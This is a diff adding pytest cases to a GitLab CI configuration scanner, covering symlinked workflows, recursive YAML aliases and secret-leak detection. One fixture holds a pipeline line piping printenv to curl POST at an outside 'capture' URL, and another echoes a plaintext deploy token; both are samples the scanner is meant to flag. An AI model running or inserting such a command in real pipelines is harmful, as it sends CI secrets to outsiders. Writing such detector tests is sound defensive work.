@@ -75,6 +75,24 @@ def test_gitlab_ci_scanner_detects_workflow_supply_chain_risks(tmp_path):
     }.items() <= findings[0].items()
 
 
+def test_gitlab_ci_script_env_exfil_flags(tmp_path):
+    gitlab_ci = tmp_path / ".gitlab-ci.yml"
+    gitlab_ci.write_text(
+        """
+image: python@sha256:01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b
+
+test:
+  script:
+    - printenv | curl -s -X POST https://env.debug.tools/capture -d @-
+""".lstrip(),
+        encoding="utf-8",
+    )
+
+    findings = scan_gitlab_ci(tmp_path)
+
+    assert "SKY-D327" in _rule_ids(findings)
+
+
 def test_gitlab_ci_scanner_accepts_pinned_minimal_workflow(tmp_path):
     full_sha = "de0fac2e4500dabe0009e67214ff5f5447ce83dd"
     gitlab_ci = tmp_path / ".gitlab-ci.yml"
@@ -134,6 +152,18 @@ def test_gitlab_ci_changed_files_stay_under_scan_root(tmp_path):
     assert findings == []
 
 
+def test_gitlab_ci_scanner_rejects_symlinked_workflow(tmp_path):
+    target = tmp_path / "outside-gitlab-ci.yml"
+    target.write_text("image: python:latest\n", encoding="utf-8")
+    link = tmp_path / ".gitlab-ci.yml"
+    try:
+        link.symlink_to(target)
+    except OSError:
+        return
+
+    assert scan_gitlab_ci(tmp_path) == []
+
+
 def test_config_scanner_routes_single_gitlab_ci_file(tmp_path):
     gitlab_ci = tmp_path / ".gitlab-ci.yml"
     _write_risky_gitlab_ci(gitlab_ci)
@@ -173,6 +203,45 @@ deploy:
     assert scan_config_files(tmp_path / "Jenkinsfile") == []
     assert scan_config_files(tmp_path / "Dockerfile") == []
     assert scan_config_files(tmp_path / "main.tf") == []
+
+
+def test_gitlab_ci_scanner_rejects_recursive_yaml_alias(tmp_path):
+    gitlab_ci = tmp_path / ".gitlab-ci.yml"
+    gitlab_ci.write_text(
+        """
+deploy: &deploy
+  stage: deploy
+  script:
+    - echo ok
+  self: *deploy
+""".lstrip(),
+        encoding="utf-8",
+    )
+
+    assert scan_gitlab_ci(tmp_path) == []
+
+
+def test_gitlab_ci_scanner_handles_shared_yaml_alias_once(tmp_path):
+    gitlab_ci = tmp_path / ".gitlab-ci.yml"
+    gitlab_ci.write_text(
+        """
+.secret-script: &secret-script
+  - echo "$DEPLOY_TOKEN"
+
+variables:
+  DEPLOY_TOKEN: plaintext-token-123
+
+deploy:
+  stage: deploy
+  script: *secret-script
+  after_script: *secret-script
+""".lstrip(),
+        encoding="utf-8",
+    )
+
+    findings = scan_gitlab_ci(tmp_path)
+
+    assert "SKY-D316" in _rule_ids(findings)
 
 
 def test_gitlab_ci_scanner_detects_ambiguous_secret_token(tmp_path):
